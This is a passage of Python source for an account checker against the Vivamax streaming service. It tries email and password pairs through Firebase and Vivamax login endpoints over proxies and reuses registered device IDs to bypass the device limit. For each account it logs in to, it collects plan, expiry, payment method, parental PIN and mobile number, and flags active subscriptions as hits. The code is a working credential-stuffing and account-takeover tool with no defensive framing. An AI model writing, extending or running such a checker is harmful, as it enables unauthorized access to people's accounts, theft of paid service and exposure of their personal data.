    except Exception as log_err:
        print(f"⚠️ Could not write to {_UNKNOWN_PLAN_LOG}: {log_err}")

def read_unknown_plan_log() -> list[dict]:
    """
    Read unknown_plans.log and return a list of dicts:
        [{"timestamp": "...", "subs_id": "...", "email": "..."}, ...]
    Returns an empty list if the file doesn't exist yet.
    """
    entries = []
    try:
        with open(_UNKNOWN_PLAN_LOG, "r", encoding="utf-8") as f:
            for line in f:
                parts = [p.strip() for p in line.strip().split("|")]
                if len(parts) == 3:
                    entries.append({
                        "timestamp": parts[0],
                        "subs_id":   parts[1],
                        "email":     parts[2],
                    })
    except FileNotFoundError:
        pass
    except Exception as e:
        print(f"⚠️ Could not read {_UNKNOWN_PLAN_LOG}: {e}")
    return entries

def print_unknown_plan_summary() -> None:
    """Print a formatted summary of all unknown plan IDs seen so far."""
    entries = read_unknown_plan_log()
    if not entries:
        print("✅ No unknown plans logged yet.")
        return
    # Deduplicate by subs_id, show count
    from collections import Counter
    counts = Counter(e["subs_id"] for e in entries)
    print(f"\n{'─'*55}")
    print(f"  UNKNOWN PLAN IDs  ({len(counts)} unique)")
    print(f"{'─'*55}")
    for subs_id, count in counts.most_common():
        last_seen = next(e["timestamp"] for e in reversed(entries) if e["subs_id"] == subs_id)
        print(f"  [{count}x] {subs_id}")
        print(f"        last seen: {last_seen}")
    print(f"{'─'*55}\n")
# ================================================


def check_vivamax(email: str, password: str, proxy_url=None):
    """Real Vivamax Checker - Improved status & expiry detection"""
    result = {
        'email': email, 
        'password': password,
        'success': False,
        'message': '',
        'email_verified': 'Yes',
        'account_creation': '',
        'plan': 'Unknown',
        'currency': 'PHP',
        'subscribable': 'False',
        'free_trial': 'False',
        'expiry': 'N/A',
        'active': 'False',
        'country': 'PH',
        'username': 'N/A',
        'plan_sub': 'Unknown',
        'max_streams': '1',
        'payment_method': 'N/A',
        'displayName': 'N/A',
        'status': 'Unknown',
        'days_left': 'N/A',
        'stars': '—',
        'auto_renew': '—',
        'price': 'N/A',
        'billing': 'N/A',
        'pin': 'N/A',
        'mobile': 'N/A',
        'subscription_start': 'N/A', 
        'last_updated': 'N/A',
        'register_location': 'N/A',
        'subscription_type': 'N/A',
        'active_subs_count': 0,
        'all_plans_detail': '',
        'active_subscriptions': [],
    }

    try:
        proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None

        # === 1. Firebase Login ===
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.6',
            'content-type': 'application/json',
            'origin': 'https://identity.vivamax.net',
            'referer': 'https://identity.vivamax.net/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        }

        resp = requests.post(
            "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBEUyk0R5bNsi_FCdK-L4Ztz5OENMA6O_U",
            json={"email": email, "password": password, "returnSecureToken": True},
            headers=headers,
            proxies=proxies,
            timeout=20
        )

        if resp.status_code != 200:
            result['message'] = "Invalid email or password"
            return result

        id_token = resp.json().get("idToken")
        if not id_token:
            result['message'] = "Login failed"
            return result

        # === 2. Vivamax Login ===
        login_headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'origin': 'https://identity.vivamax.net',
            'referer': 'https://identity.vivamax.net/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
            'x-appname': 'Identity/release-R60-32'
        }

        device_payload = {
            "idToken": id_token,
            "deviceType": "COMP",
            "modelNo": "20030107",
            "deviceName": "Win32",
            "deviceId": "-459410908",
            "serialNo": "-459410908"
        }

        viva_resp = requests.post(
            "https://api2.vivamax.net/v1/viva/login",
            json=device_payload,
            headers=login_headers,
            proxies=proxies,
            timeout=20
        )

        if viva_resp.status_code not in (200, 201):
            result['message'] = f"Login failed ({viva_resp.status_code})"
            return result

        data = viva_resp.json()

        # === DEVICE LIMIT BYPASS: retry login using the already-registered device ===
        if data.get('error') == 'Exceed Devices Limit':
            existing_devices = data.get('devices', [])
            if existing_devices:
                # Cycle through ALL registered devices (handles Max 2/3/4 plans)
                bypass_success = False
                for i, existing in enumerate(existing_devices):
                    retry_payload = {
                        "idToken":    id_token,
                        "deviceType": existing.get("deviceType", "COMP"),
                        "modelNo":    existing.get("modelNo",    "20030107"),
                        "deviceName": existing.get("deviceName", "Win32"),
                        "deviceId":   existing.get("deviceId",   device_payload["deviceId"]),
                        "serialNo":   existing.get("serialNo",   device_payload["serialNo"]),
                    }
                    retry_resp = requests.post(
                        "https://api2.vivamax.net/v1/viva/login",
                        json=retry_payload,
                        headers=login_headers,
                        proxies=proxies,
                        timeout=20
                    )
                    if retry_resp.status_code in (200, 201):
                        retry_data = retry_resp.json()
                        if not retry_data.get('error'):
                            data = retry_data
                            print(f"[VIVAMAX] Device bypass OK — slot {i+1}/{len(existing_devices)}, "
                                  f"deviceId={existing.get('deviceId')}")
                            bypass_success = True
                            break
                        else:
                            print(f"[VIVAMAX] Device slot {i+1} errored: {retry_data.get('error')} — trying next")
                    else:
                        print(f"[VIVAMAX] Device slot {i+1} HTTP {retry_resp.status_code} — trying next")

                if not bypass_success:
                    print(f"[VIVAMAX] All {len(existing_devices)} device(s) failed bypass — account fully locked")
                    result['message'] = f"Device limit reached ({len(existing_devices)} device(s) registered, all slots busy)"
            else:
                print("[VIVAMAX] Exceed Devices Limit but no device list returned")

        # === 3. Profile endpoint — enriches subscription/plan data ===
        # Called by the real browser immediately after login.
        # Returns the same data PLUS nested subscription.planInfo, activeSubscriptions, etc.
        # No HMAC headers needed — sessionToken alone is sufficient auth.
        session_token = data.get("sessionToken")
        if session_token:
            try:
                profile_headers = {
                    'accept': 'application/json, text/plain, */*',
                    'origin': 'https://identity.vivamax.net',
                    'referer': 'https://identity.vivamax.net/',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
                    'x-appname': 'Identity/release-R60-32',
                }
                profile_resp = requests.get(
                    f"https://api2.vivamax.net/v1/viva/profile?sessionToken={session_token}",
                    headers=profile_headers,
                    proxies=proxies,
                    timeout=15
                )
                if profile_resp.status_code == 200:
                    profile_data = profile_resp.json()
                    if profile_data and not profile_data.get('error'):
                        # Merge profile data into login data:
                        # - Only fill fields that are missing in login response
                        # - Always prefer profile's nested subscription object (has planInfo)
                        # - Always prefer profile's activeSubscriptions list
                        for key, val in profile_data.items():
                            if val is not None and not data.get(key):
                                data[key] = val
                        # Force-apply richer nested objects from profile
                        prof_sub = profile_data.get('subscription')
                        if prof_sub and prof_sub.get('planInfo'):
                            data['subscription'] = prof_sub
                        if profile_data.get('activeSubscriptions'):
                            data['activeSubscriptions'] = profile_data['activeSubscriptions']
                        has_plan = bool(prof_sub and prof_sub.get('planInfo')) if prof_sub else False
                        n_active = len(profile_data.get('activeSubscriptions', []))
                        print(f"[VIVAMAX] Profile enriched — planInfo={has_plan}, activeSubscriptions={n_active}")
                    else:
                        print(f"[VIVAMAX] Profile error: {profile_data.get('error', 'unknown')} — using login data")
                else:
                    print(f"[VIVAMAX] Profile HTTP {profile_resp.status_code} — using login data only")
            except Exception as prof_err:
                print(f"[VIVAMAX] Profile call failed ({prof_err}) — using login data only")
        else:
            print("[VIVAMAX] No sessionToken in login response — skipping profile call")

        # ====================== DEBUG ======================
        print(f"[DEBUG] subscriptionId={data.get('subscriptionId')} | "
              f"sub.subscriptionId={data.get('subscription', {}).get('subscriptionId')} | "
              f"status={data.get('subscriptionStatus')} | "
              f"sub.status={data.get('subscription', {}).get('status')} | "
              f"autoRenewing={data.get('subscription', {}).get('googleSubscriptionDetails', {}).get('autoRenewing', 'N/A')}")
        # ===================================================

        # === ROBUST EXTRACTION ===
        result['username'] = data.get("displayName", "N/A")
        result['displayName'] = result['username']

        # Subscription status detection.
        # NOTE: data.get("status") is intentionally EXCLUDED — the login response
        # always returns "status":"active" for the device/session, which is NOT
        # the subscription status and would cause cancelled accounts to appear as hits.
        sub_data_early = data.get("subscription", {})
        result['status'] = (
            data.get("subscriptionStatus") or
            sub_data_early.get("subscriptionStatus") or
            sub_data_early.get("status") or
            sub_data_early.get("state") or
            data.get("accountStatus") or
            data.get("memberStatus") or
            data.get("membershipStatus") or
            data.get("subscriptionState") or
            sub_data_early.get("subscriptionState") or
            "UNKNOWN"
        ).upper().strip()

        result['pin'] = data.get("parentalControlPin", "N/A")
        result['mobile'] = data.get("mobileNumber", "N/A")
        result['country'] = data.get("subscriptionLocation", data.get("registerLocation", "PH"))

        # Account creation & last updated
        if data.get("createdAt"):
            try:
                created = datetime.fromisoformat(data["createdAt"].replace("Z", "+00:00"))
                result['account_creation'] = created.strftime("%Y-%m-%d")
            except:
                result['account_creation'] = data.get("createdAt", "N/A")

        if data.get("updatedAt"):
            try:
                updated = datetime.fromisoformat(data["updatedAt"].replace("Z", "+00:00"))
                result['last_updated'] = updated.strftime("%Y-%m-%d %H:%M")
            except:
                result['last_updated'] = data.get("updatedAt", "N/A")

        # ====================== IMPROVED PLAN EXTRACTION + REAL PRICE DETECTION ======================
        sub_data = data.get("subscription", {})

        # Get subscription ID from ALL possible field names the Vivamax API may use
        subs_id = (
            data.get("subscriptionId") or
            data.get("subscriptionPlan") or
            data.get("planId") or
            data.get("plan") or
            data.get("subs_id") or
            sub_data.get("subscriptionId") or
            sub_data.get("subscriptionPlan") or
            sub_data.get("planId") or
            sub_data.get("plan") or
            sub_data.get("subs_id") or
            sub_data.get("planInfo", {}).get("subs_id") or
            sub_data.get("planInfo", {}).get("subscriptionId") or
            sub_data.get("planInfo", {}).get("planId") or
            ""
        )
        raw_subs_id = (subs_id or "").strip()
        subs_id = raw_subs_id or "UNKNOWN"

        # Detect subscription type BEFORE resolving PayMongo IDs so we still
        # know the original billing platform even after normalization.
        sub_type_raw = (
            data.get("subscriptionType") or
            sub_data.get("subscriptionType") or
            data.get("paymentSource") or
            sub_data.get("paymentSource") or
            ""
        ).lower().strip()

        if sub_type_raw:
            # Use whatever the API tells us directly
            result['subscription_type'] = sub_type_raw.capitalize()
        elif raw_subs_id.startswith("plan_"):
            result['subscription_type'] = "PayMongo"
        elif raw_subs_id.endswith("_app"):
            result['subscription_type'] = "Apple"
        elif raw_subs_id.endswith("_android") or raw_subs_id.endswith("_google"):
            result['subscription_type'] = "Google Play"
        elif raw_subs_id.endswith("_web") or raw_subs_id:
            result['subscription_type'] = "Web"

        # Resolve PayMongo plan IDs (e.g. "plan_fd838...") → readable subs_id
        # before any further lookup so the rest of the chain works normally.
        if subs_id.startswith("plan_") and subs_id in PAYMONGO_PLAN_MAP:
            subs_id = PAYMONGO_PLAN_MAP[subs_id]

        # 1. Try official planInfo first (most accurate when present)
        plan_info = sub_data.get("planInfo", {})

        # 2. Smart fallback using our product cache
        # Tries exact ID, stripping suffixes, AND adding _web (Google Play returns IDs
        # without _web suffix but fallback plans are keyed with _web).
        if not plan_info or not plan_info.get("title"):
            base_id = subs_id.replace('_web', '').replace('_app', '').replace('_android', '').replace('_google', '')
            plan_info = (
                VIVAMAX_PRODUCTS.get(subs_id) or
                VIVAMAX_PRODUCTS.get(subs_id + '_web') or
                VIVAMAX_PRODUCTS.get(base_id) or
                VIVAMAX_PRODUCTS.get(base_id + '_web') or
                VIVAMAX_FALLBACK_PLANS.get(subs_id) or
                VIVAMAX_FALLBACK_PLANS.get(subs_id + '_web') or
                VIVAMAX_FALLBACK_PLANS.get(base_id) or
                VIVAMAX_FALLBACK_PLANS.get(base_id + '_web') or
                {}
            )

        # 3. Try to extract price from other locations even if planInfo is missing
        if not plan_info or not plan_info.get("price") or plan_info.get("price") == "N/A":
            google_details = sub_data.get("googleSubscriptionDetails", {}) or sub_data.get("subscriptionDetails", {})
            paymongo = sub_data.get("paymongoSubscriptionDetails", {})

            # Convert priceAmountMicros (e.g. "169000000") → "₱169.00"
            micros_raw = google_details.get("priceAmountMicros") or sub_data.get("priceAmountMicros")
            micros_price = None
            if micros_raw:
                try:
                    currency = google_details.get("priceCurrencyCode", "PHP")
                    symbol = "₱" if currency == "PHP" else currency + " "
                    micros_price = f"{symbol}{int(micros_raw) / 1_000_000:.2f}"
                except Exception:
                    pass

            price_candidates = [
                plan_info.get("price"),
                sub_data.get("price"),
                data.get("price"),
                google_details.get("price"),
                google_details.get("priceAmount"),
                micros_price,
                paymongo.get("attributes", {}).get("amount"),
                paymongo.get("amount"),
            ]
            
            actual_price = next((p for p in price_candidates if p and str(p).strip() not in ["N/A", "None", ""]), None)
            
            if actual_price:
                plan_info["price"] = str(actual_price)
            
            # Try to get billing info too
            if not plan_info.get("billing"):
                billing_candidates = [
                    sub_data.get("billingCycle"),
                    google_details.get("billingInterval"),
                    data.get("billing"),
                ]
                billing = next((b for b in billing_candidates if b), None)
                if billing:
                    plan_info["billing"] = str(billing)

        # 4. Final safety net for truly unknown plans
        if not plan_info or not plan_info.get("title"):
            if subs_id and subs_id != "UNKNOWN":
                # Real subscription ID we don't recognize — log it and notify
                print(f"⚠️ [UNKNOWN PLAN DETECTED] subscriptionId = '{subs_id}'")
                _log_unknown_plan(subs_id, email)
                plan_info = {
                    "title": f"Custom Plan ({subs_id})",
                    "price": plan_info.get("price", "N/A"),
                    "billing": plan_info.get("billing", "N/A"),
                    "concurrent_stream": plan_info.get("concurrent_stream", 1)
                }
            else:
                # No subscription ID at all — account has no active plan
                plan_info = {
                    "title": "No Active Plan",
                    "price": "N/A",
                    "billing": "N/A",
                    "concurrent_stream": 1
                }

        # Expose raw subs_id so main.py can use it
        result['subs_id'] = subs_id

        # Apply the final values to result
        result['plan'] = plan_info.get("title", subs_id)
        result['price'] = plan_info.get("price", "N/A")
        result['billing'] = plan_info.get("billing") or \
            f"{plan_info.get('duration', '')} {plan_info.get('period', '')}".strip() or "N/A"
        result['max_streams'] = str(plan_info.get("concurrent_stream", "1"))

        # === MULTI-SUBSCRIPTION SUPPORT ===
        # activeSubscriptions is populated by the profile call (or sometimes in login response).
        # Each entry has its own planInfo, expiry, status, and autoRenewing.
        active_subs_raw = data.get("activeSubscriptions", [])
        processed_entries = []
        if active_subs_raw and isinstance(active_subs_raw, list):
            now_ts = datetime.now().timestamp()
            for sub_entry in active_subs_raw:
                sub_status = (
                    sub_entry.get("status") or
                    sub_entry.get("subscriptionStatus") or ""
                ).upper()

                # Determine if still valid by expiry (handles CANCELLED-but-grace-period accounts)
                raw_expiry = (
                    sub_entry.get("expiryTimeMillis") or
                    sub_entry.get("subscriptionExpiryTime") or
                    sub_entry.get("subscriptionDetails", {}).get("expiryTimeMillis") or
                    0
                )
                try:
                    exp_val = int(raw_expiry)
                    sub_expiry_s = exp_val / 1000 if exp_val > 1e11 else exp_val
                except Exception:
                    sub_expiry_s = 0

                still_valid = sub_expiry_s > now_ts if sub_expiry_s else False

                if sub_status == "ACTIVE" or still_valid:
                    # Resolve plan name via planInfo → product cache → fallback map
                    sub_plan_id = (
                        sub_entry.get("subscriptionId") or
                        sub_entry.get("planInfo", {}).get("subs_id") or
                        sub_entry.get("planInfo", {}).get("subscriptionId") or
                        ""
                    ).strip()
                    sub_base_id = sub_plan_id.replace('_web','').replace('_app','').replace('_android','').replace('_google','')

                    sub_plan_info = (
                        sub_entry.get("planInfo") or
                        VIVAMAX_PRODUCTS.get(sub_plan_id) or
                        VIVAMAX_PRODUCTS.get(sub_plan_id + '_web') or
                        VIVAMAX_PRODUCTS.get(sub_base_id) or
                        VIVAMAX_FALLBACK_PLANS.get(sub_plan_id) or
                        VIVAMAX_FALLBACK_PLANS.get(sub_plan_id + '_web') or
                        VIVAMAX_FALLBACK_PLANS.get(sub_base_id) or
                        {}
                    )

                    sub_plan_name = sub_plan_info.get("title") or sub_plan_id or "Unknown Plan"

                    # Price: planInfo → priceAmountMicros → fallback
                    sub_price = sub_plan_info.get("price", "")
                    if not sub_price:
                        gd = sub_entry.get("googleSubscriptionDetails", {}) or sub_entry.get("subscriptionDetails", {})
                        micros = gd.get("priceAmountMicros")
                        if micros:
                            try:
                                curr = gd.get("priceCurrencyCode", "PHP")
                                sym = "₱" if curr == "PHP" else curr + " "
                                sub_price = f"{sym}{int(micros) / 1_000_000:.2f}"
                            except Exception:
                                pass

                    sub_expiry_str = (
                        datetime.fromtimestamp(sub_expiry_s).strftime("%Y-%m-%d")
                        if sub_expiry_s else "N/A"
                    )
                    sub_days_left = int((sub_expiry_s - now_ts) / 86400) if sub_expiry_s else -1
                    gd_entry = sub_entry.get("googleSubscriptionDetails", {}) or {}
                    sub_auto_renew = "ON" if gd_entry.get("autoRenewing") else "OFF"

                    processed_entries.append({
                        "plan_id": sub_plan_id,
                        "plan": sub_plan_name,
                        "price": sub_price or "N/A",
                        "expiry": sub_expiry_str,
                        "days_left": sub_days_left,
                        "streams": int(sub_plan_info.get("concurrent_stream", 1)),
                        "status": sub_status,
                        "auto_renew": sub_auto_renew,
                    })

        result['active_subscriptions'] = processed_entries
        result['active_subs_count'] = len(processed_entries)

        if len(processed_entries) > 1:
            # Multiple valid subscriptions — combine plan names and stream counts
            plan_names = " + ".join(e["plan"] for e in processed_entries)
            result['plan'] = plan_names
            result['max_streams'] = str(sum(e["streams"] for e in processed_entries))
            # Formatted breakdown for display
            lines = []
            for e in processed_entries:
                renew_tag = f"🔄{e['auto_renew']}"
                lines.append(
                    f"• {e['plan']} | {e['price']} | {e['days_left']}d left | {renew_tag}"
                )
            result['all_plans_detail'] = "\n".join(lines)
            print(f"[VIVAMAX] Multi-plan account: {plan_names}")

        elif len(processed_entries) == 1:
            # Single subscription — fill any gaps with its data
            entry = processed_entries[0]
            if result.get('plan') in ('Unknown', 'No Active Plan', 'UNKNOWN', ''):
                result['plan'] = entry['plan']
            if result.get('price', 'N/A') == 'N/A':
                result['price'] = entry['price']
            result['all_plans_detail'] = ""

        else:
            result['all_plans_detail'] = ""
        # ====================================================================================
        # Subscription Start — confirmed fields: top-level number + subscription.startTimeMillis string
        start_ts = (
            data.get("subscriptionStartTime") or
            sub_data.get("startTimeMillis") or
            None
        )
        if start_ts:
            try:
                ts_val = int(start_ts)
                if ts_val > 1e11:
                    result['subscription_start'] = datetime.fromtimestamp(ts_val / 1000).strftime("%Y-%m-%d")
                else:
                    result['subscription_start'] = datetime.fromtimestamp(ts_val).strftime("%Y-%m-%d")
            except:
                pass

        # Personal info
        result['receive_promos'] = "Yes" if data.get("isReceive") else "No"
        result['device_type'] = data.get("deviceType", "N/A")
        result['device_name'] = data.get("deviceName", "N/A")
        result['email_verified'] = 'Yes' if data.get('email_verified') else 'No'
        result['register_location'] = data.get("registerLocation", "N/A")
        result['business_unit'] = data.get("business_unit", "N/A")
        result['sub_type'] = data.get("subscriptionType", "N/A")

        # From googleSubscriptionDetails inside subscription
        google_details = sub_data.get("googleSubscriptionDetails", {})
        result['currency'] = google_details.get("priceCurrencyCode", "N/A")
        result['order_id'] = google_details.get("orderId", "N/A")
        result['purchase_country'] = google_details.get("countryCode", "N/A")

        # Payment Method
        sub_type = data.get("subscriptionType", "").lower().strip()
        paymongo = sub_data.get("paymongoSubscriptionDetails", {})
        paymongo_type = paymongo.get("attributes", {}).get("type", "").strip()
        apple = sub_data.get("appleSubscriptionDetails", {})

        if paymongo_type:
            result['payment_method'] = paymongo_type.title()
        elif apple:
            result['payment_method'] = "Apple Store"
        elif sub_type == "google":
            result['payment_method'] = "Google Play"
        elif sub_type:
            result['payment_method'] = sub_type.title()
        else:
            result['payment_method'] = "N/A"

        # Auto Renew
        if google_details:
            result['auto_renew'] = "ON" if google_details.get("autoRenewing") else "OFF"
        elif apple:
            pending = apple.get("pending_renewal_info", [{}])[0]
            result['auto_renew'] = "ON" if pending.get("auto_renew_status") == "1" else "OFF"
        else:
            raw = data.get("autoRenew", data.get("auto_renew"))
            result['auto_renew'] = "ON" if raw else "OFF"

        # === FINAL DECISION: cross-check status + expiry ===
        status_upper = result['status']
        is_active = False
        message = ""
        days_left_int = -1

        # Try every possible expiry field — confirmed from real API + extras for edge cases
        # NOTE: subscription.expiryTimeMillis is a STRING in the real API response
        # For Google Play accounts the expiry also lives inside googleSubscriptionDetails
        google_details_expiry = sub_data.get("googleSubscriptionDetails", {})
        paymongo_details = sub_data.get("paymongoSubscriptionDetails", {})
        paymongo_attrs = paymongo_details.get("attributes", {})
        apple_details = sub_data.get("appleSubscriptionDetails", {})
        expiry_ts = (
            data.get("subscriptionExpiryTime") or          # top-level number (confirmed)
            sub_data.get("expiryTimeMillis") or            # nested string (confirmed)
            google_details_expiry.get("expiryTimeMillis") or  # Google Play nested expiry
            google_details_expiry.get("expiryTime") or
            sub_data.get("subscriptionExpiryTime") or
            data.get("expiryTime") or
            data.get("expiredAt") or
            data.get("expiresAt") or
            sub_data.get("expiryTime") or
            sub_data.get("expiredAt") or
            sub_data.get("expiresAt") or
            sub_data.get("endDate") or
            sub_data.get("endTime") or
            # PayMongo subscription expiry (current_period_end = Unix seconds)
            paymongo_attrs.get("current_period_end") or
            paymongo_details.get("current_period_end") or
            paymongo_attrs.get("billing_cycle_anchor") or
            paymongo_attrs.get("next_payment_at") or
            # Apple receipt fields
            apple_details.get("expires_date_ms") or
            (apple_details.get("latest_receipt_info", [{}])[-1].get("expires_date_ms") if isinstance(apple_details.get("latest_receipt_info"), list) and apple_details.get("latest_receipt_info") else None) or
            None
        )
        # Also check ISO string date fields
        expiry_str = (
            data.get("subscriptionExpiry") or
            data.get("expiryDate") or
            sub_data.get("expiryDate") or
            sub_data.get("subscriptionExpiry") or
            sub_data.get("endTime") or            # confirmed field in real API response
            sub_data.get("end_time") or
            paymongo_attrs.get("current_period_end_date") or
            paymongo_attrs.get("ends_at") or
            apple_details.get("expires_date") or
            (apple_details.get("latest_receipt_info", [{}])[-1].get("expires_date") if isinstance(apple_details.get("latest_receipt_info"), list) and apple_details.get("latest_receipt_info") else None) or
            None
        )

        if expiry_ts:
            try:
                # Handle both millisecond and second timestamps
                ts_val = int(expiry_ts)
                if ts_val > 1e11:  # milliseconds
                    expiry_date = datetime.fromtimestamp(ts_val / 1000)
                else:              # seconds
                    expiry_date = datetime.fromtimestamp(ts_val)
                days_left_int = (expiry_date - datetime.now()).days
                result['expiry'] = expiry_date.strftime("%Y-%m-%d")
                if days_left_int == 0:
                    result['days_left'] = "Expires Today"
                elif days_left_int > 0:
                    result['days_left'] = str(days_left_int)
                else:
                    result['days_left'] = "Expired"
            except:
                pass

        # Fallback: parse ISO string expiry if timestamp lookup found nothing
        if days_left_int == -1 and expiry_str:
            try:
                expiry_date = datetime.fromisoformat(
                    str(expiry_str).replace("Z", "+00:00").split("+")[0]
                )
                days_left_int = (expiry_date - datetime.now()).days
                result['expiry'] = expiry_date.strftime("%Y-%m-%d")
                if days_left_int == 0:
                    result['days_left'] = "Expires Today"
                elif days_left_int > 0:
                    result['days_left'] = str(days_left_int)
                else:
                    result['days_left'] = "Expired"
            except:
                pass

        # All known "active" status values the Vivamax API may return
        ACTIVE_STATUSES = {
            "ACTIVE", "SUBSCRIBED", "PAID", "PREMIUM", "VALID",
            "ACTIVE_SUBSCRIPTION", "ACTIVE_SUBSCRIBED", "ONGOING",
            "CONFIRMED", "ENABLED", "SUBSCRIBED_ACTIVE",
        }
        # All known "dead" status values
        DEAD_STATUSES = {
            "CANCELLED", "CANCELED", "EXPIRED", "EXPIRED_SUBSCRIPTION",
            "INACTIVE", "TERMINATED", "SUSPENDED",
        }

        # Debug dump — ALWAYS printed when plan or status can't be resolved
        if subs_id == "UNKNOWN" or status_upper == "UNKNOWN" or days_left_int == -1:
            import json
            safe_dump = {k: v for k, v in data.items()
                         if k not in ("idToken", "password", "token")}
            print(f"[VIVAMAX DEBUG] subs_id={subs_id} status={status_upper} "
                  f"days_left={days_left_int} "
                  f"raw_keys={list(data.keys())} "
                  f"sub_keys={list(data.get('subscription', {}).keys())} "
                  f"dump={json.dumps(safe_dump, default=str)[:3000]}")

        status_is_active = status_upper in ACTIVE_STATUSES
        status_is_dead   = status_upper in DEAD_STATUSES

        if status_is_dead:
            # Explicitly cancelled/expired — always dead regardless of expiry
            is_active = False
            if status_upper in {"CANCELLED", "CANCELED"}:
                message = "Subscription Cancelled"
            else:
                message = "Subscription Expired"
        elif status_is_active and days_left_int >= 0:
            # Status says active AND expiry confirms it
            is_active = True
            message = "ACTIVE SUBSCRIPTION!"
        elif status_is_active and days_left_int == -1:
            # Status says active but expiry not found in API — trust the status
            is_active = True
            message = "ACTIVE SUBSCRIPTION!"
        elif status_is_active and days_left_int < 0:
            # Status says active but expiry is in the past
            is_active = False
            message = "Subscription EXPIRED (status mismatch)"
        elif days_left_int >= 0:
            # Expiry confirms active even if status field is unrecognised
            is_active = True
            message = "ACTIVE SUBSCRIPTION!"
        elif subs_id != "UNKNOWN" and plan_info.get("title", "No Active Plan") != "No Active Plan":
            # Has a recognised plan but no status/expiry data — treat as active
            is_active = True
            message = "ACTIVE SUBSCRIPTION!"
        else:
            message = "Valid account but no active plan"

        result['message'] = message
        result['active'] = 'Yes' if is_active else 'No'
        result['success'] = is_active

    except Exception as e:
        result['message'] = f"Error: {str(e)[:100]}"

    return result
